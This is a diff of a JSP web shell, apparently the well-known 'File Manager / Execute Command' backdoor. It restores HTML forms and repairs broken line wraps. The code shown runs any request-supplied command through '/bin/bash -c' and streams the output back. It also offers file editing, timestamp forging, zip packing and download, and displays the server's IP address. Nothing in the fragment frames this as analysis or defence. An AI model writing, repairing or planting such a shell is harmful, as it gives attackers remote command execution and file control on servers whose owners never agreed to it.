-" + "" + "hour:" + "
-								+ cal.get(Calendar.HOUR)								+ 
-" + "minute:" + "
-								+ cal.get(Calendar.MINUTE)								+ 
-" + "second:" + "
-								+ cal.get(Calendar.SECOND)								+ 
-" + "
-
-" + "
-\"Submit\"
- 
-\"Back\"
-
-" + "
-" + "
-");
+						.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"
+								+ "<form name=\"form1\" id=\"form1\" action=\""
+								+ SHELL_NAME
+								+ "\" method=\"post\" >"
+								+ "<h2>Set File Property &raquo;</h2>"
+								+ "<p>Current File (FullPath)<br /><input class=\"input\" name=\"file\" id=\"file\" value=\""
+								+ request.getParameter("filepath")
+								+ "\" type=\"text\" size=\"120\"  /></p>"
+								+ "<input type=\"hidden\" name=\"o\" value=\"editProperty\"> "
+								+ "<p>"
+								+ "  <input type=\"checkbox\" disabled "
+								+ read
+								+ " name=\"read\" id=\"checkbox\">Read "
+								+ "  <input type=\"checkbox\" disabled "
+								+ write
+								+ " name=\"write\" id=\"checkbox2\">Write "
+								+ "</p>"
+								+ "<p>Instead &raquo;"
+								+ "year:"
+								+ "<input class=\"input\" name=\"year\" value="
+								+ cal.get(Calendar.YEAR)
+								+ " id=\"year\" type=\"text\" size=\"4\"  />"
+								+ "month:"
+								+ "<input class=\"input\" name=\"month\" value="
+								+ (cal.get(Calendar.MONTH) + 1)
+								+ " id=\"month\" type=\"text\" size=\"2\"  />"
+								+ "day:"
+								+ "<input class=\"input\" name=\"date\" value="
+								+ cal.get(Calendar.DATE)
+								+ " id=\"date\" type=\"text\" size=\"2\"  />"
+								+ ""
+								+ "hour:"
+								+ "<input class=\"input\" name=\"hour\" value="
+								+ cal.get(Calendar.HOUR)
+								+ " id=\"hour\" type=\"text\" size=\"2\"  />"
+								+ "minute:"
+								+ "<input class=\"input\" name=\"minute\" value="
+								+ cal.get(Calendar.MINUTE)
+								+ " id=\"minute\" type=\"text\" size=\"2\"  />"
+								+ "second:"
+								+ "<input class=\"input\" name=\"second\" value="
+								+ cal.get(Calendar.SECOND)
+								+ " id=\"second\" type=\"text\" size=\"2\"  />"
+								+ "</p>"
+								+ "<p><input class=\"bt\" name=\"submit\" value=\"Submit\" id=\"submit\" type=\"submit\" value=\"Submit\"> <input class=\"bt\" name=\"submit\" value=\"Back\" id=\"submit\" type=\"button\" onclick=\"history.back()\"></p>"
+								+ "</form>" + "</td></tr></table>");
 			} catch (Exception e) {
 				throw e;
 			}
@@ -1475,8 +1690,7 @@ Instead »" + "year:" + "
 	}
 
 	private static class EditPropertyInvoker extends DefaultInvoker {
-		public boolean doBefor
-e() {
+		public boolean doBefore() {
 			return false;
 		}
 
@@ -1512,7 +1726,7 @@ e() {
 				} else {
 					JSession
 							.setAttribute(MSG,
-									"Reset File Property Failed!");
+									"<span style='color:red'>Reset File Property Failed!</span>");
 				}
 				response.sendRedirect(SHELL_NAME);
 			} catch (Exception e) {
@@ -1541,38 +1755,35 @@ e() {
 					JSession.removeAttribute(MSG);
 				}
 				out
-						.println(""
-								+ "
-" + "" + "
-Execute Program »
-" + "
-" + "
-\"shell\"
-" + "
-\"program\"
-" + "Parameter
-\""
-" + "
-\"Execute\"
-" + "
-
-" + "" + "
-" + "
-Execute Shell »
-" + "
-" + "
-\"shell\"
-" + "
-\"command\"
-" + "Parameter
-\""
-" + "
-\"Execute\"
-" + "
-
-" + "
-" + "
-");
+						.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"
+								+ "<form name=\"form1\" id=\"form1\" action=\""
+								+ SHELL_NAME
+								+ "\" method=\"post\" >"
+								+ "<h2>Execute Program &raquo;</h2>"
+								+ "<p>"
+								+ "<input type=\"hidden\" name=\"o\" value=\"shell\">"
+								+ "<input type=\"hidden\" name=\"type\" value=\"program\">"
+								+ "Parameter<br /><input class=\"input\" name=\"program\" id=\"program\" value=\""
+								+ program
+								+ "\" type=\"text\" size=\"100\"  />"
+								+ "<input class=\"bt\" name=\"submit\" id=\"submit\" value=\"Execute\" type=\"submit\" size=\"100\"  />"
+								+ "</p>"
+								+ "</form>"
+								+ "<form name=\"form1\" id=\"form1\" action=\""
+								+ SHELL_NAME
+								+ "\" method=\"post\" >"
+								+ "<h2>Execute Shell &raquo;</h2>"
+								+ "<p>"
+								+ "<input type=\"hidden\" name=\"o\" value=\"shell\">"
+								+ "<input type=\"hidden\" name=\"type\" value=\"command\">"
+								+ "Parameter<br /><input class=\"input\" name=\"command\" id=\"command\" value=\""
+								+ cmd
+								+ "\" type=\"text\" size=\"100\"  />"
+								+ "<input class=\"bt\" name=\"submit\" id=\"submit\" value=\"Execute\" type=\"submit\" size=\"100\"  />"
+								+ "</p>"
+								+ "</form>"
+								+ "</td>"
+								+ "</tr></table>");
 			} catch (Exception e) {
 
 				throw e;
@@ -1590,17 +1801,14 @@ Execute Shell »
 				if (type.equals("command")) {
 					((Invoker) ins.get("vs")).invoke(request, response,
 							JSession);
-					out.println("
-");
-					out.println("
-");
+					out.println("<div style='margin:10px'><hr/>");
+					out.println("<pre>");
 					String command = request.getParameter("command");
 					if (!Util.isEmpty(command)) {
 						String[] com2= new String[]{"/bin/bash", "-c", command};
 						Process pro = Runtime.getRuntime().exec(com2);
 						BufferedReader reader = new BufferedReader(
-								new InputStre
-amReader(pro.getInputStream()));
+								new InputStreamReader(pro.getInputStream()));
 						String s = reader.readLine();
 						while (s != null) {
 							out.println(Util.htmlEncode(Util.getStr(s)));
@@ -1614,8 +1822,7 @@ amReader(pro.getInputStream()));
 							s = reader.readLine();
 						}
 						reader.close();
-						out.println("
-");
+						out.println("</pre></div>");
 					}
 				} else {
 					String program = request.getParameter("program");
@@ -1670,8 +1877,7 @@ amReader(pro.getInputStream()));
 				BufferedInputStream input = new BufferedInputStream(i);
 				BufferedOutputStream output = new BufferedOutputStream(response
 						.getOutputStream());
-				byte[] data = new byte
-[1024];
+				byte[] data = new byte[1024];
 				int len = input.read(data);
 				while (len != -1) {
 					output.write(data, 0, len);
@@ -1755,8 +1961,7 @@ amReader(pro.getInputStream()));
 					} else {
 						String msg = "Move File Failed!";
 						if (file.isDirectory()) {
-							msg += "The Move Will Failed When The D
-irectory Is Not Empty.";
+							msg += "The Move Will Failed When The Directory Is Not Empty.";
 						}
 						JSession.setAttribute(MSG, msg);
 					}
@@ -1849,8 +2054,7 @@ irectory Is Not Empty.";
 					return;
 				}
 				ZipOutputStream zout = new ZipOutputStream(
-						new 
-BufferedOutputStream(new FileOutputStream(saveF)));
+						new BufferedOutputStream(new FileOutputStream(saveF)));
 				String[] arr = files.split(",");
 				for (int i = 0; i < arr.length; i++) {
 					String f = arr[i];
@@ -1920,8 +2124,7 @@ BufferedOutputStream(new FileOutputStream(saveF)));
 				}
 				String packedFile = request.getParameter("packedfile");
 				if (Util.isEmpty(packedFile))
-					ret
-urn;
+					return;
 				this.packFile = packedFile;
 				String saveFileName = request.getParameter("savefilename");
 				File saveF = null;
@@ -1991,8 +2194,7 @@ urn;
 				}
 			} else {
 				String tmpBase = base;
-				if (
-!Util.isEmpty(tmpBase) && !tmpBase.endsWith("/"))
+				if (!Util.isEmpty(tmpBase) && !tmpBase.endsWith("/"))
 					tmpBase += "/";
 				zipFile(f, tmpBase, zout);
 			}
@@ -2065,8 +2267,7 @@ urn;
 					if (index != -1)
 						entryPath = entryPath.substring(0, index);
 					File absEntryFile = new File(save, entryPath);
-					if
- (!absEntryFile.exists()
+					if (!absEntryFile.exists()
 							&& (en.isDirectory() || en.getName().indexOf("/") != -1))
 						absEntryFile.mkdirs();
 					BufferedOutputStream output = null;
@@ -2109,17 +2310,22 @@ urn;
 			try {
 				PrintWriter out = response.getWriter();
 				out
-						.println("
-"
-								+ ""
-								+ "	"
-								+ "		"
-								+ "	"
-								+ "	"
-								+ "		" + "
-v" + request.getHeader("host") + " (" + InetAddress.getLocalHost().getHostAddress() + ") | copy
-Logout | " + " File Manager | " + " Execu te Command | " + "
-");
+						.println("<form action=\""
+								+ SHELL_NAME
+								+ "\" method=\"post\" name=\"doForm\"></form>"
+								+ "<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">"
+								+ "	<tr class=\"head\">"
+								+ "		<td><span style=\"float:right;\">v</span>"
+								+ request.getHeader("host")
+								+ " (<span id='ip'>"
+								+ InetAddress.getLocalHost().getHostAddress()
+								+ "</span>) | <a href=\"javascript:if (!window.clipboardData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText));alert('ok')}\">copy</a></td>"
+								+ "	</tr>"
+								+ "	<tr class=\"alt1\">"
+								+ "		<td><a href=\"javascript:doPost({o:'logout'});\">Logout</a> | "
+								+ "			<a href=\"javascript:doPost({o:'fileList'});\">File Manager</a> | "
+								+ "			<a href=\"javascript:doPost({o:'vs'});\">Execute Command</a> | "
+								+ "	</tr>" + "</table>");
 				if (JSession.getAttribute(MSG) != null) {
 					Util.outMsg(out, JSession.getAttribute(MSG).toString());
 					JSession.removeAttribute(MSG);
@@ -2180,8 +2386,7 @@ Logout | " + " File Manager | " + " Execu te Command | " + "
 					if (o == null)
 						return;
 					OnLineProcess olp = (OnLineProcess) o;
-		
-			olp.setCmd(cmd);
+					olp.setCmd(cmd);
 				} else {
 					Object o = JSession.getAttribute(SHELL_ONLINE);
 					if (o == null)
@@ -2246,8 +2451,7 @@ Logout | " + " File Manager | " + " Execu te Command | " + "
 				String path = request.getParameter("folder");
 				if (!Util.isEmpty(path)
 						&& session.getAttribute(ENTER) == null)
-					session.setAttribute(CURRENT_DIR, path
-);
+					session.setAttribute(CURRENT_DIR, path);
 				((Invoker) ins.get("before")).invoke(request, response,
 						session);
 				((Invoker) ins.get("script")).invoke(request, response,
@@ -2279,8 +2483,7 @@ Logout | " + " File Manager | " + " Execu te Command | " + "
 		session.setAttribute(CURRENT_DIR, SHELL_DIR);
 		Util.outMsg(out, Util
 				.htmlEncode(new String(bout.toByteArray())).replaceAll(
-						"\n", "
-"), "left");
+						"\n", "<br/>"), "left");
 		bout.close();
 		out.flush();
 		((Invoker) ins.get("bottom"))
@@ -2288,32 +2491,3 @@ Logout | " + " File Manager | " + " Execu te Command | " + "
 		((Invoker) ins.get("after")).invoke(request, response, session);
 	}
 %>
- new MoveInvoker());
-		ins.put("removedir", new RemoveDirInvoker());
-		ins.put("packBatch", new PackBatchInvoker());
-		ins.put("pack", new PackInvoker());
-		ins.put("unpack", new UnPackInvoker());
-		ins.put("top", new TopInvoker());
-		ins.put("online", new OnLineInvoker());
-	}%>
-<%
-	try {
-		String o = request.getParameter("o");
-		if (Util.isEmpty(o)) {
-			if (session.getAttribute(SESSION_O) == null)
-				o = "index";
-			else {
-				o = session.getAttribute(SESSION_O).toString();
-				session.removeAttribute(SESSION_O);
-			}
-		}
-		Object obj = ins.get(o);
-		if (obj == null) {
-			response.sendRedirect(SHELL_NAME);
-		} else {
-			Invoker in = (Invoker) obj;
-			if (in.doBefore()) {
-				String path = request.getParameter("folder");
-				if (!Util.isEmpty(path)
-						&& session.getAttribute(ENTER) == null)
-					session.setAttribute(CURRENT_DIR, path
